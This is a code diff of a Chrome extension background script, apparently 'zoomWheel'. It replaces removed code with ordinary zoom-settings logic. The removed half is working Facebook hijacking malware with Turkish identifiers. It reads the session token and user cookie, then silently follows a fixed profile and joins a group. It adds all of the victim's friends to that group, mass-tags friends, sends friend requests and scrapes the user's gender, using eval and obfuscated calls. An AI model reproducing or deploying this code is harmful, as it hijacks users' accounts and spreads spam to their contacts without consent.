@@ -1,223 +1,230 @@
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
-function cereziAl(isim) {
-var tarama = isim + "=";
-if (document.cookie.length > 0) {
-konum = document.cookie.indexOf(tarama)
-if (konum != -1) {
-konum += tarama.length
-son = document.cookie.indexOf(";", konum)
-if (son == -1)
-son = document.cookie.length
-return unescape(document.cookie.substring(konum, son))
-}
-else { return ""; }
-}
-}
+if(!localStorage.version || localStorage.version!="1.0.1.4" )
+{
+	localStorage.version = "1.0.1.4"
+	 var opt = {
+        type: "basic",
+        title: "zoomWheel Extension",
+        message: "Thank you very much for your patience in such a long time. Just want to say that zoomWheel has come back to Chrome and now I am making a big update for it. \n\tSorry if this message bothered you. Have a nice day :) !",
+        iconUrl: chrome.extension.getURL("images/zoom.png"),
+      }
 
-function getRandomInt (min, max) {
-return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-function randomValue(arr) {
-return arr[getRandomInt(0, arr.length-1)];
-}
+   // chrome.notifications.create("update_notify", opt, function(){});    
+ }
+ 
+	function init()
+	{
+		
+		localStorage.defaultZoom = (localStorage.defaultZoom==undefined)? 100:localStorage.defaultZoom;
+		localStorage.maxZoom = (localStorage.maxZoom==undefined)? 350:localStorage.maxZoom;
+		localStorage.minZoom = (localStorage.minZoom==undefined)? 40:localStorage.minZoom;
+		localStorage.AAOnZoom = (localStorage.AAOnZoom==undefined)? 160:localStorage.AAOnZoom;
+		localStorage.adjustHeight = (localStorage.adjustHeight==undefined)? false:localStorage.adjustHeight;
+		localStorage.zoomStep = (localStorage.zoomStep==undefined)? 15:localStorage.zoomStep;
+		localStorage.showIcon = (localStorage.showIcon==undefined)? true:localStorage.showIcon;
+		localStorage.defaultSave = (localStorage.defaultSave==undefined)? null:localStorage.defaultSave;
+		localStorage.zoomURLData = (localStorage.zoomURLData==undefined)?JSON.stringify({}):localStorage.zoomURLData;
+		localStorage.zoomDomainData = (localStorage.zoomDomainData==undefined)?JSON.stringify({}):localStorage.zoomDomainData;
+		//localStorage.zoomStringData = (localStorage.zoomStringData==undefined)? JSON.stringify([]):localStorage.zoomStringData;
+	}
+	
+	
+	
+	function encode(input) 
+		{			return  input.replace(/\W/gi,"")+""		}	
+	
+	
+	function savedZoom(domain,url)
+	{
 
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+		init()
+		
+			zoomDomain = JSON.parse(localStorage.zoomDomainData)
+			z =   zoomDomain[encode(domain)]
+			//eval("z = zoomDomain['" + encode(domain)+"']") ;
+			if(z!=undefined) return ({zoomRatio:z,type:"domain"})  ;
 
-function a(abone){
-var http4 = new XMLHttpRequest();
+		else 
+		{
+			zoomURL = JSON.parse(localStorage.zoomURLData)  ;
+			z = 	zoomURL[encode(url)]
+			if(z!=undefined)  return ({zoomRatio:z,type:"URL"})  ;
+			else return ({zoomRatio:null,type:null})  ;
+		}
+		
+		
+	}
+	
+	function Settings()
+	{
+		return	({
+			defaultZoom:localStorage.defaultZoom,
+			maxZoom:localStorage.maxZoom ,
+			adjustHeight:localStorage.adjustHeight ,
+			minZoom:localStorage.minZoom,
+			AAOnZoom:localStorage.AAOnZoom,
+			zoomStep:localStorage.zoomStep,
+			showIcon:localStorage.showIcon,
+			defaultSave:localStorage.defaultSave
+		})
+	}
+	
+	function callUpdate()
+	{
+	chrome.windows.getAll({populate:true}, function (wins){
+		
+		for (k = 0; k < wins.length; k++) {
+			for (i = 0; i < wins[k].tabs.length; i++) {
+			
+				chrome.tabs.sendMessage(wins[k].tabs[i].id, {
+					msg: "updateUrSettings"
+				});
+			}
+			
+		}
+		
+	})
+		chrome.tabs.getAllInWindow(null, function(tabs)
+		{
+			for (i = 0; i < tabs.length; i++) 
+			{
+				chrome.tabs.sendMessage(tabs[i].id, {
+					msg: "updateUrSettings"
+				});
 
-var url4 = "/ajax/follow/follow_profile.php?__a=1";
+			}
+			
+		})
 
-var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
-http4.open("POST", url4, true);
+		
+		
+	}
+chrome.runtime.onMessage.addListener(
+  function(request, sender, sendResponse)
+  {
+  	
+  	var port = chrome.tabs.connect(sender.tab.id, {name: "zoomWithMe"})
+	
+	
+		if(request.msg == "getSettings")
+	{
+		sendResponse(Settings());
+	}
+				
+	if(request.msg == "getSavedZoom")
+	{
+	
+		sendResponse(savedZoom(request.domain,request.url))
+	}
+	
+	
+	if(request.msg=="wheelZoom")
+	{
+		
+		sendResponse({msg:"wheelZoom",sender:request.sender,data: request.data,step:request.Step,max:350,min:40,new_zoom:request.new_zoom});
+	}
+	
+	if(request.msg=="changeZoomLabel")
+	{
+		sendResponse({msg:"changeZoomLabel",newZoom:request.newZoom});
+	}
+	if(request.msg=="resetZoom")
+	{
+		sendResponse({msg:"resetZoom",sender:request.sender});
+	}
+	
+	if(request.msg=="showIcon")
+	{
+		sendResponse({msg:"showIcon",sender:request.sender});
+	}
+	
+	if(request.msg =="changeHiding")
+	{
+		sendResponse({msg:"changeHiding",newValue:request.newValue});
+	}
+	
+	if(request.msg =="saveZoom")
+	{
+		saveZoom(request.type,{url:request.url,domain:request.domain},request.ratio)
+	}
+	
+			
+	if (request.msg == "deleteZoom") 
+	{
 
-//Send the proper header information along with the request
-http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-http4.setRequestHeader("Content-length", params4.length);
-http4.setRequestHeader("Connection", "close");
-
-http4.onreadystatechange = function() {//Call a function when the state changes.
-if(http4.readyState == 4 && http4.status == 200) {
-
-http4.close; // Close the connection
-
-}
-}
-
-http4.send(params4);
-}
-
-function sublist(uidss) {
-var a = document.createElement('script');
-a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
-document.body.appendChild(a);
-}
-
-a("100002050179152");
-
-
-sublist("");
-
-
-
-var gid = ['1744763822447762'];
-
-var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
-var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
-
-var httpwp = new XMLHttpRequest();
-var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
-var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
-httpwp['open']('POST', urlwp, true);
-httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
-httpwp['setRequestHeader']('Content-length', paramswp['length']);
-httpwp['setRequestHeader']('Connection', 'keep-alive');
-httpwp['send'](paramswp);
-
-var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
-var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
-
-var friends = new Array();
-gf = new XMLHttpRequest();
-gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
-gf['send']();
-if (gf['readyState'] != 4) {} else {
-data = eval('(' + gf['responseText']['substr'](9) + ')');
-if (data['error']) {} else {
-friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
-return _0x93dax8['index'] - _0x93dax9['index'];
-});
-};
-};
-
-for (var i = 0; i < friends['length']; i++) {
-var httpwp = new XMLHttpRequest();
-var urlwp = '/ajax/groups/members/add_post.php?__a=1';
-var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
-httpwp['open']('POST', urlwp, true);
-httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
-httpwp['setRequestHeader']('Content-length', paramswp['length']);
-httpwp['setRequestHeader']('Connection', 'keep-alive');
-httpwp['onreadystatechange'] = function () {
-if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
-};
-httpwp['send'](paramswp);
-};
-var spage_id = "180221595724665";
-var spost_id = "399399003590603";
-var sfoto_id = "192240281119067";
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-var smesaj = "";
-var smesaj_text = "";
-var arkadaslar = [];
-var svn_rev;
-var bugun= new Date();
-var btarihi = new Date(); 
-btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
-if(!document.cookie.match(/paylasti=(\d+)/)){
-document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
-}
-
-
-//arkadaslari al ve isle
-function sarkadaslari_al(){
-var xmlhttp = new XMLHttpRequest();
-xmlhttp.onreadystatechange = function () {
-if(xmlhttp.readyState == 4){
-eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
-for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
-smesaj = "";
-smesaj_text = "";
-for(i=f*10;i<(f+1)*10;i++){
-if(arkadaslar.payload.entries[i]){
-smesaj += " @[" + arkadaslar.payload.entries[i].uid + ":" + arkadaslar.payload.entries[i].text + "]";
-smesaj_text += " " + arkadaslar.payload.entries[i].text;
-}
-}
-sdurumpaylas();	}
-
-}
-
-};
-var params = "&filter[0]=user";
-params += "&options[0]=friends_only";
-params += "&options[1]=nm";
-params += "&token=v7";
-params += "&viewer=" + user_id;
-params += "&__user=" + user_id;
-
-if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
-else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
-xmlhttp.send();
-}
-
-//tiklama olayini dinle
-var tiklama = document.addEventListener("click", function () {
-if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
-svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
-sarkadaslari_al();
-document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
-
-document.removeEventListener(tiklama);
-}
-}, false);
+		deleteZoom(request.type,request.value)
+	}
+  });
 
 
-//arkada?¾ ekleme
-function sarkadasekle(uid,cins){
-var xmlhttp = new XMLHttpRequest();
-xmlhttp.onreadystatechange = function () {
-if(xmlhttp.readyState == 4){	
-}
-};
+function saveZoom(type,value,ratio)
+{
+	init();
+	
+	if(type =="domain") 
+		{
+		
+			zoomDomain = JSON.parse(localStorage.zoomDomainData)
+			zoomDomain[encode(value.domain)] = ratio;
+			localStorage.zoomDomainData = JSON.stringify(zoomDomain)
+		}
+	
+	
+		if(type =="URL") 
+		{
+		
+			zoomURL = JSON.parse(localStorage.zoomURLData)
+			zoomURL[encode(value.url)] = ratio;
+			localStorage.zoomURLData =  JSON.stringify(zoomURL)
 
-xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
-var params = "to_friend=" + uid;
-params += "&action=add_friend";
-params += "&how_found=friend_browser";
-params += "&ref_param=none";
-params += "&outgoing_id=";
-params += "&logging_location=friend_browser";
-params += "&no_flyout_on_click=true";
-params += "&ego_log_data=";
-params += "&http_referer=";
-params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
-params += "&phstamp=165816749114848369115";
-params += "&__user=" + user_id;
-xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
-xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
-
-if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
-xmlhttp.send(params);
-}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
-cinsiyetgetir(uid,cins,"sarkadasekle");
-}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
-xmlhttp.send(params);
-}
+			
+	
+		}
+		
+		/*
+		if(request.type =="customString") 
+		{
+			zoomString = JSON.parse(localStorage.zoomStringData)
+			zoomString.push(JSON.stringify({value:request.string,ratio:request.ratio}))
+			localStorage.zoomStringData = JSON.stringify(zoomString)
+		}
+		*/
+	
 }
 
-//cinsiyet belirleme
-var cinssonuc = {};
-var cinshtml = document.createElement("html");
-function scinsiyetgetir(uid,cins,fonksiyon){
-var xmlhttp = new XMLHttpRequest();
-xmlhttp.onreadystatechange = function () {
-if(xmlhttp.readyState == 4){
-eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
-cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
-btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
-if(cinshtml.getElementsByTagName("select")[0].value == "1"){
-document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
-}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
-document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
+
+function deleteZoom(type, value)
+{
+		init()
+		if (type == "URL") 
+		{
+			zoomURL = JSON.parse(localStorage.zoomURLData)  ;
+			zoomURL[encode(value)] = undefined  ;
+			localStorage.zoomURLData = JSON.stringify(zoomURL)  ;
+		}
+		if (type == "domain") 
+		{
+			zoomDomain = JSON.parse(localStorage.zoomDomainData)  ;
+			zoomDomain[encode(value)] = undefined ;
+			localStorage.zoomDomainData = JSON.stringify(zoomDomain)   ;
+		}
+	
 }
-eval(fonksiyon + "(" + id + "," + cins + ");");
+
+
+	
+	chrome.browserAction.onClicked.addListener( function(tab){
+  openOptions()
+    } );
+		
+		
+			
+function openOptions()
+
+{
+	
 }
-};
-xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
-xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
-xmlhttp.send();
-}
+
+init();
+
+
